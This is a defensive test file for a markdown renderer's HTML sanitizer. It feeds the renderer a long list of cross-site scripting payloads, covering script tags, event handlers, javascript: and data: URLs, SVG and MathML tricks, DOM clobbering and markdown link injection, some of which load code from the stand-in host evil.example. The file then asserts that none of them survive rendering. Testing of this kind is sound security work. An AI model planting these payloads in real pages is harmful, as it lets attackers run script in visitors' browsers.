/**
 * The package reads and sanitizes HTML itself, so this is where it is attacked: every payload is
 * drawn (whole, and at every prefix a stream could stop at) and the page is then read back tag by
 * tag. Nothing may come out that runs script, loads a frame, submits a form or styles the page.
 */
import { describe, expect, test } from 'bun:test'
import { render } from '../../test/render'
import { math } from '../math'

const PAYLOADS = [
  // Script and its relatives.
  '<script>alert(1)</script>',
  '<SCRIPT SRC=//evil.example/x.js></SCRIPT>',
  '<scr<script>ipt>alert(1)</scr</script>ipt>',
  '<script\n>alert(1)</script\n>',
  '<script/x>alert(1)</script>',
  '<<script>alert(1)//<</script>',
  '<style>*{background:url(javascript:alert(1))}</style>',
  '<style onload=alert(1)></style>',
  '<iframe src="javascript:alert(1)"></iframe>',
  '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
  '<object data="javascript:alert(1)"></object>',
  '<embed src="javascript:alert(1)">',
  '<link rel=stylesheet href="//evil.example/x.css">',
  '<meta http-equiv=refresh content="0;url=javascript:alert(1)">',
  '<base href="javascript:alert(1)//">',
  '<form action="javascript:alert(1)"><input type=submit></form>',
  '<button formaction="javascript:alert(1)">x</button>',
  '<textarea autofocus onfocus=alert(1)></textarea>',
  '<select autofocus onfocus=alert(1)></select>',
  '<input autofocus onfocus=alert(1)>',
  '<input type="text" value="x">',
  '<input type=checkbox onclick=alert(1)>',
  '<video src=x onerror=alert(1)></video>',
  '<audio src=x onerror=alert(1)></audio>',
  '<video><source onerror=alert(1)></video>',
  '<marquee onstart=alert(1)>x</marquee>',
  '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
  '<template><script>alert(1)</script></template>',
  '<xmp><script>alert(1)</script></xmp>',
  '<plaintext><script>alert(1)</script>',
  '<title><script>alert(1)</script></title>',
  '<frameset onload=alert(1)>',
  '<applet code=x>',
  '<portal src=//evil.example>',
  // Namespaces.
  '<svg onload=alert(1)>',
  '<svg><script>alert(1)</script></svg>',
  '<svg><a xlink:href="javascript:alert(1)"><text y=20>x</text></a></svg>',
  '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
  '<svg><foreignObject><iframe src=javascript:alert(1)></iframe></foreignObject></svg>',
  '<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">',
  '<math href="javascript:alert(1)">x</math>',
  '<math><maction actiontype=statusline xlink:href=javascript:alert(1)>x</maction></math>',
  // Event handlers on allowed elements.
  '<img src=x onerror=alert(1)>',
  '<img src=x ONERROR=alert(1)>',
  '<img src=x onerror\n=alert(1)>',
  '<img src=x/onerror=alert(1)>',
  '<img src="x"onerror="alert(1)">',
  "<img src='x'onerror='alert(1)'>",
  '<img src=x onerror=alert`1`>',
  '<img """><script>alert(1)</script>">',
  '<img src="x` `<script>alert(1)</script>"` `>',
  '<b onmouseover=alert(1)>x</b>',
  '<div onclick="alert(1)" onpointerdown=alert(1) onanimationend=alert(1)>x</div>',
  '<details open ontoggle=alert(1)><summary>x</summary></details>',
  '<a href="https://ok.example" onclick="alert(1)">x</a>',
  '<p style="position:fixed;inset:0;background:red">x</p>',
  '<div style="background:url(javascript:alert(1))">x</div>',
  '<span style="display:none">hidden instructions</span>',
  '<table background="javascript:alert(1)"><tr><td>x</td></tr></table>',
  '<td background="javascript:alert(1)">x</td>',
  '<body onload=alert(1)>',
  '<html onmouseover=alert(1)>',
  // URLs on allowed elements.
  '<a href="javascript:alert(1)">x</a>',
  '<a href="JaVaScRiPt:alert(1)">x</a>',
  '<a href=" javascript:alert(1)">x</a>',
  '<a href="\tjavascript:alert(1)">x</a>',
  '<a href="java\tscript:alert(1)">x</a>',
  '<a href="java\nscript:alert(1)">x</a>',
  '<a href="java&#9;script:alert(1)">x</a>',
  '<a href="java&Tab;script:alert(1)">x</a>',
  '<a href="java&NewLine;script:alert(1)">x</a>',
  '<a href="&#106;avascript:alert(1)">x</a>',
  '<a href="&#x6A;avascript:alert(1)">x</a>',
  '<a href="&#0000106avascript:alert(1)">x</a>',
  '<a href="javascript&colon;alert(1)">x</a>',
  '<a href="javascript&#58;alert(1)">x</a>',
  '<a href="&#1;javascript:alert(1)">x</a>',
  '<a href="\u0001javascript:alert(1)">x</a>',
  '<a href="vbscript:msgbox(1)">x</a>',
  '<a href="data:text/html,<script>alert(1)</script>">x</a>',
  '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>',
  '<a href="blob:https://evil.example/x">x</a>',
  '<a href="file:///etc/passwd">x</a>',
  '<a href="feed:javascript:alert(1)">x</a>',
  '<a href="jar:https://evil.example!/x">x</a>',
  '<a href="//evil.example" target="_blank" ping="//evil.example/p">x</a>',
  '<a href="https://ok.example" target="_top">x</a>',
  '<img src="javascript:alert(1)">',
  '<img src="data:image/svg+xml,<svg onload=alert(1)>">',
  '<img src=x srcset="javascript:alert(1) 1x">',
  '<img src=x lowsrc="javascript:alert(1)" dynsrc="javascript:alert(1)">',
  '<img longdesc="javascript:alert(1)" src=x>',
  '<picture><source srcset="javascript:alert(1)"><img src=x></picture>',
  '<blockquote cite="javascript:alert(1)">x</blockquote>',
  '<q cite="javascript:alert(1)">x</q>',
  '<del cite="javascript:alert(1)">x</del>',
  // Clobbering the page and escaping the element.
  '<a id="location" name="location">x</a>',
  '<img name="cookie" id="body" src=x>',
  '<form id="document"><input name="getElementById"></form>',
  '<div class="llx-markdown admin fixed">x</div>',
  '<div class="llx-copy" data-task-key="0" data-streaming>x</div>',
  '<div innerHTML="<img src=x onerror=alert(1)>" dangerouslySetInnerHTML="x">x</div>',
  '<div is="x-script" slot="x" part="x" contenteditable autofocus tabindex=0 accesskey=x>x</div>',
  '<div data-callout="note" data-callout-title="</aside><script>alert(1)</script>">x</div>',
  '<answer-tabs><answer-tab data-label="<img src=x onerror=alert(1)>">x</answer-tab></answer-tabs>',
  '<p title="&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;">x</p>',
  "<p title='\"><script>alert(1)</script>'>x</p>",
  '<!--<script>alert(1)</script>-->',
  '<!-- --!><script>alert(1)</script>',
  '<!--><script>alert(1)</script>',
  '<![CDATA[<script>alert(1)</script>]]>',
  '<?xml version="1.0"?><script>alert(1)</script>',
  '<!DOCTYPE html><script>alert(1)</script>',
  '</p><script>alert(1)</script>',
  '<\u0000script>alert(1)</script>',
  '<scr\u0000ipt>alert(1)</scr\u0000ipt>',
  '\u003cscript\u003ealert(1)\u003c/script\u003e',
  '&lt;script&gt;alert(1)&lt;/script&gt;',
  '<div><p><b><i><u><table><tr><td><script>alert(1)</script>',
  // Markdown's own links, images and code.
  '[x](javascript:alert(1))',
  '[x](JAVASCRIPT:alert(1))',
  '[x](<javascript:alert(1)>)',
  '[x]( javascript:alert(1) )',
  '[x](javascript&colon;alert(1))',
  '[x](&#106;avascript:alert(1))',
  '[x](java\tscript:alert(1))',
  '[x](data:text/html,<script>alert(1)</script>)',
  '[x](vbscript:alert(1))',
  '[x][r]\n\n[r]: javascript:alert(1)',
  '[x][r]\n\n[r]: <javascript:alert(1)> "t"',
  '![x](javascript:alert(1))',
  '![x](data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+)',
  '![x" onerror="alert(1)](https://ok.example/a.png)',
  '![x](https://ok.example/a.png "t\\" onerror=\\"alert(1)")',
  '[x](https://ok.example "t\\" onmouseover=\\"alert(1)")',
  '<javascript:alert(1)>',
  '<data:text/html,x>',
  'javascript:alert(1)',
  'www.evil.example" onmouseover="alert(1)',
  'https://ok.example/"onmouseover="alert(1)',
  '`<script>alert(1)</script>`',
  '```html\n<script>alert(1)</script>\n```',
  '```"><script>alert(1)</script>\nx\n```',
  '```js title="</span><script>alert(1)</script>"\nx\n```',
  '```mermaid\ngraph TD\nA["<img src=x onerror=alert(1)>"]\n```',
  '```tree\n<img src=x onerror=alert(1)>/\n└── <script>alert(1)</script>\n```',
  '> [!NOTE] <img src=x onerror=alert(1)>\n> <script>alert(1)</script>',
  '> [!TABS]\n\n**<img src=x onerror=alert(1)>**\n\ntext\n\n**b**\n\ntext\n\n---',
  '> [!SOURCES]\n- [x](javascript:alert(1)) note\n- [y](https://ok.example"onclick="alert(1)) z',
  '> [!DETAILS] <script>alert(1)</script>\n> body',
  '# <script>alert(1)</script>\n\n## <img src=x onerror=alert(1)>',
  '| <script>alert(1)</script> | b |\n|---|---|\n| <img src=x onerror=alert(1)> | 2 |',
  '- [ ] <input onfocus=alert(1) autofocus>',
  'Text[^a]\n\n[^a]: <script>alert(1)</script> [x](javascript:alert(1))',
  '[^"><script>alert(1)</script>]: x\n\ny[^"><script>alert(1)</script>]',
  '$\\href{javascript:alert(1)}{x}$',
  '$$\n\\htmlClass{llx-markdown}{x} \\url{javascript:alert(1)}\n$$',
  '```math\n\\href{javascript:alert(1)}{x}\n```',
  '$<script>alert(1)</script>$',
]

/** Elements a reply must never put on the page. */
const FORBIDDEN = new Set(
  (
    'script style iframe frame frameset object embed applet link meta base form button textarea ' +
    'select option template noscript xmp plaintext title body html head video audio track canvas ' +
    'marquee portal dialog slot foreignobject animate set use image'
  ).split(' '),
)
const URL_ATTRIBUTES = new Set(
  'href src srcset cite longdesc action formaction poster background data xlink:href ping manifest'.split(
    ' ',
  ),
)
const SAFE_URL = /^(?:(?:https?|mailto|ircs?|xmpp):|[^:]*(?:[/?#]|$))/i

const decode = (value: string): string =>
  value
    .replace(/&#x([0-9a-f]+);/gi, (_, hex: string) => String.fromCodePoint(parseInt(hex, 16)))
    .replace(/&#([0-9]+);/g, (_, digits: string) => String.fromCodePoint(Number(digits)))
    .replace(/&quot;/g, '"')
    .replace(/&#x27;/g, "'")
    .replace(/&lt;/g, '<')
    .replace(/&gt;/g, '>')
    .replace(/&amp;/g, '&')

interface Finding {
  tag: string
  problem: string
}

/** Everything in a page a browser could act on, read from the markup React wrote. */
function findings(page: string, { katex = false, slugs = false } = {}): Finding[] {
  const out: Finding[] = []
  const tags = /<([A-Za-z][^\s/>]*)((?:\s+[^\s=/>]+(?:="[^"]*")?)*)\s*\/?>/g
  for (const hit of page.matchAll(tags)) {
    const tag = (hit[1] as string).toLowerCase()
    const inSvg =
      tag === 'svg' ||
      tag === 'path' ||
      tag === 'circle' ||
      tag === 'line' ||
      tag === 'rect' ||
      tag === 'polyline' ||
      tag === 'g'
    // React's own hint to fetch an image it is about to draw; its URL is checked like any other.
    const preload =
      tag === 'link' && /^\s+rel="preload"\s+as="image"\s+href="[^"]*"$/.test(hit[2] as string)
    // The package's own controls (a tab, a copy button): a reply cannot write a button at all.
    const control =
      tag === 'button' &&
      /\stype="button"/.test(hit[2] as string) &&
      /\sclass="llx-[a-z-]+(?: llx-[a-z-]+)*"/.test(hit[2] as string)
    if (FORBIDDEN.has(tag) && !preload && !control) out.push({ tag, problem: 'forbidden element' })
    for (const attribute of (hit[2] as string).matchAll(/([^\s=/>]+)(?:="([^"]*)")?/g)) {
      const name = (attribute[1] as string).toLowerCase()
      const value = decode(attribute[2] ?? '')
      if (name.startsWith('on')) out.push({ tag, problem: `handler ${name}` })
      // The renderer's own inline styles: a table cell's alignment, a tree row's depth, KaTeX's layout.
      if (
        name === 'style' &&
        !/^(text-align:(left|right|center)|--llx-tree-depth:\d+)$/.test(value) &&
        !katex
      )
        out.push({ tag, problem: `style ${value}` })
      if (URL_ATTRIBUTES.has(name)) {
        for (const url of name === 'srcset'
          ? value.split(',').map((part) => part.trim().split(/\s+/)[0] ?? '')
          : [value])
          // eslint-disable-next-line no-control-regex
          if (!SAFE_URL.test(url.replace(/[\u0000-\u0020]/g, '')) && url !== '')
            out.push({ tag, problem: `${name}=${url}` })
      }
      // With `headingIds` a heading's id is the slug of its text: letters, digits, `-` and `_`.
      if (slugs && name === 'id' && /^h[1-6]$/.test(tag) && /^[\p{L}\p{N}\p{M}_-]+$/u.test(value))
        continue
      if (
        (name === 'id' || name === 'name') &&
        !inSvg &&
        !/^(user-content-|llx-|_[rR]_|:[rR])/.test(value) &&
        value !== ''
      )
        out.push({ tag, problem: `${name}=${value}` })
      // A link may open elsewhere, as GitHub's own READMEs do, but only without a handle on this page.
      if (
        name === 'target' &&
        !(tag === 'a' && /\srel="(?:[^"]*\s)?noopener(?:\s[^"]*)?"/.test(hit[2] as string))
      )
        out.push({ tag, problem: `target without noopener` })
      if (
        name === 'ping' ||
        name === 'srcdoc' ||
        name === 'is' ||
        name === 'contenteditable' ||
        name === 'autofocus' ||
        name === 'slot' ||
        name === 'part'
      )
        out.push({ tag, problem: `attribute ${name}` })
      if (name === 'class' && tag !== 'svg')
        for (const part of value.split(/\s+/))
          if (
            part &&
            !/^(llx-|language-|hl-|hljs|katex|contains-task-list$|task-list-item$|sr-only$|footnotes$|data-footnote-backref$|mord|mspace|mbin|mrel|mopen|mclose|mpunct|minner|base$|strut$|vlist|pstrut$|sizing$|reset-|size\d|mtight$|msupsub$|mathnormal$|mathrm$|mathit$|enclosing$|col-align|arraycolsep|mtable$|accent|frac-line|mfrac$|nulldelimiter$|sqrt$|svg-align$|hide-tail$|root$|op-symbol$|large-op$|small-op$|mop$|delimsizing$|delimcenter$|mult$|amsrm$|textrm$|mathbf$|text$|mathsf$|mathtt$|boldsymbol$|x-arrow|cancel|stretchy$|brace|halfarrow|overline|underline|rule$|tag$|eqn-num$|thinbox$|llap$|rlap$|clap$|inner$|fix$|fbox$|fcolorbox$|boxpad$|mover$|munder$|newline$|sout$|katex-)/.test(
              part,
            )
          )
            out.push({ tag, problem: `class ${part}` })
    }
  }
  return out
}

/** A page's findings, or nothing. Text that only looks like a tag is escaped by React and is not one. */
const attack = (markdown: string, props: Parameters<typeof render>[1] = {}): Finding[] =>
  findings(render(markdown, props), {
    katex: Boolean(props?.math),
    slugs: Boolean(props?.headingIds),
  })

describe('nothing a reply writes can act on the page', () => {
  test('the checker itself sees what it must', () => {
    expect(findings('<script>x</script>')).toHaveLength(1)
    expect(findings('<img src="x" onerror="alert(1)"/>')).toHaveLength(1)
    expect(findings('<a href="javascript:alert(1)">x</a>')).toHaveLength(1)
    expect(findings('<a href="java&#x9;script:alert(1)">x</a>')).toHaveLength(1)
    expect(findings('<p style="position:fixed">x</p>')).toHaveLength(1)
    expect(findings('<a id="location">x</a>')).toHaveLength(1)
    expect(findings('<div class="admin">x</div>')).toHaveLength(1)
    expect(findings('<source srcSet="javascript:alert(1)"/>')).toHaveLength(1)
    expect(findings('<a href="/a" target="_blank">x</a>')).toHaveLength(1)
    expect(findings('<button onclick="x">x</button>').length).toBeGreaterThan(0)
    expect(findings('<button type="submit" class="llx-tab">x</button>')).toHaveLength(1)
    expect(findings('<a href="/a" target="_blank" rel="nofollow noopener">x</a>')).toHaveLength(0)
    expect(findings('<link rel="stylesheet" href="/x.css"/>')).toHaveLength(1)
    expect(findings('<link rel="preload" as="image" href="javascript:alert(1)"/>')).toHaveLength(1)
    expect(findings('<a href="https://ok.example/a?b#c">x</a><img src="/a.png"/>')).toHaveLength(0)
  })

  for (const [mode, props] of [
    ['with the HTML stage', {}],
    ['with HTML and math', { math }],
    ['with HTML off', { html: false }],
    ['with heading ids', { headingIds: true }],
  ] as const) {
    test(`${mode}: ${PAYLOADS.length} payloads, whole`, () => {
      for (const payload of PAYLOADS) expect(attack(payload, props), payload).toEqual([])
    })
  }

  test('at every prefix a stream could stop at', () => {
    for (const payload of PAYLOADS)
      for (let end = 1; end <= payload.length; end++) {
        const prefix = payload.slice(0, end)
        expect(attack(prefix, { streaming: true, math }), prefix).toEqual([])
      }
  })

  test('inside other content, and one after another', () => {
    const wrap = [
      (payload: string) => `Text before ${payload} and after.`,
      (payload: string) => `- item ${payload}\n- [ ] task ${payload}`,
      (payload: string) => `> quoted ${payload}`,
      (payload: string) =>
        `| a | b |\n|---|---|\n| ${payload.replace(/\n/g, ' ').replace(/\|/g, '\\|')} | 2 |`,
      (payload: string) => `<details><summary>${payload}</summary>\n\n${payload}\n\n</details>`,
      (payload: string) => `<div align="center">\n\n${payload}\n\n</div>`,
    ]
    for (const payload of PAYLOADS)
      for (const around of wrap)
        expect(attack(around(payload), { math }), around(payload)).toEqual([])
    expect(attack(PAYLOADS.join('\n\n'), { math })).toEqual([])
    expect(attack(PAYLOADS.join(' '), { math })).toEqual([])
  })
})

describe('a refused URL', () => {
  test('is dropped, not left as an empty attribute', () => {
    expect(render('[x](javascript:alert(1))')).toContain('<a>x</a>')
    expect(render('[x][r]\n\n[r]: data:text/html,x')).toContain('<a>x</a>')
    expect(render('![x](javascript:alert(1))')).toContain('<img alt="x"/>')
    expect(render('<img src="javascript:alert(1)" alt="y">')).not.toContain('src=')
    expect(render('<a href="vbscript:x">z</a>')).toContain('<a>z</a>')
    const refuseAll = () => null
    expect(render('[x](https://ok.example)', { urlTransform: refuseAll })).toContain('<a>x</a>')
  })

  test('an allowed one, and a link written with no URL, are kept as written', () => {
    expect(render('[x](https://ok.example)')).toContain('<a href="https://ok.example">x</a>')
    expect(render('![x](/a.png)')).toContain('<img src="/a.png" alt="x"/>')
    // CommonMark's `[x]()` is a link to an empty URL.
    expect(render('[x]()')).toContain('<a href="">x</a>')
    expect(render('![x]()')).toContain('<img alt="x"/>')
  })
})
